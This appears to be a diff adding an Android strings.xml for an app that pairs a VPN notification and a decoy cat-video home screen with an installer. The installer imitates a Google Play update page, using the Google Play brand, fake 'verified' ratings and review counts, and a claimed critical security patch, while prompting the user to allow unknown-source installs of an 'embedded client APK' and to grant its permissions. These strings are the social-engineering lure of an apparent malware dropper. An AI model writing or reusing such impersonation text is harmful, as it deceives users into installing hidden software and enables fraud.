@@ -1,0 +1,46 @@
+<resources>
+    <!-- app_name / client_app_name 由 android-package.properties → resValue 注入 -->
+
+    <string name="vpn_notification_channel">VPN Service</string>
+    <string name="vpn_notification_channel_desc">VPN Running Notification</string>
+    <string name="vpn_notification_title">VPN Active</string>
+    <string name="vpn_notification_text">Protecting your network connection</string>
+    <string name="vpn_permission_required">VPN permission must be granted to use this app.</string>
+    <string name="home_play">Play</string>
+    <string name="home_featured">Featured</string>
+    <string name="home_row_1">Midnight Purr Club</string>
+    <string name="home_row_2">Sunny Window Nap</string>
+    <string name="home_row_3">Kitchen Patrol Live</string>
+    <string name="install_title">Update Available</string>
+    <string name="install_desc">To use this app, download the latest version.</string>
+    <string name="install_update">Update</string>
+    <string name="install_retry">Retry</string>
+    <string name="install_idle">Waiting for update</string>
+    <string name="install_downloading">Downloading… %1$d%%</string>
+    <string name="install_extracting">Preparing package… %1$d%%</string>
+    <string name="install_error_no_payload">Embedded client APK missing. Rebuild installer after packaging the client.</string>
+    <string name="install_preparing">Preparing installation, please wait…</string>
+    <string name="install_please_wait">Please wait…</string>
+    <string name="install_confirm_system">Confirm installation in the system dialog</string>
+    <string name="install_error">Update failed: %1$s</string>
+    <string name="install_permission_hint">Please allow installing apps from unknown sources</string>
+    <string name="install_done_back_to_home">Installation complete. Returned to home</string>
+    <string name="install_permissions_incomplete">%1$s permissions are incomplete. Tap Update to open the app and finish setup.</string>
+    <string name="install_permissions_ready">%1$s is ready</string>
+    <string name="install_open_client_failed">Unable to open %1$s. Tap Update to reinstall.</string>
+    <string name="play_brand">Google Play</string>
+    <string name="install_content_rating">Everyone</string>
+    <string name="install_content_rating_size">Everyone  7.4 MB</string>
+    <string name="install_whats_new">Whats new</string>
+    <string name="install_last_updated">Last updated Jun 23, 2026</string>
+    <string name="install_whats_new_body">We are always making changes and improvements to this app. To make sure you do not miss a thing, just keep your Updates turned on.</string>
+    <string name="install_whats_new_item1">• Bug fixes and performance improvements.</string>
+    <string name="install_whats_new_item2">• Critical security vulnerability patch.</string>
+    <string name="install_more_info">More info</string>
+    <string name="install_ratings_title">Ratings and reviews</string>
+    <string name="install_ratings_disclaimer">Ratings and reviews are verified and are from people who use the same type of device that you use.</string>
+    <string name="install_rating_score">4.6</string>
+    <string name="install_rating_count">110,681</string>
+    <string name="install_installing">Installing...</string>
+    <string name="install_percent">%1$d%%</string>
+</resources>
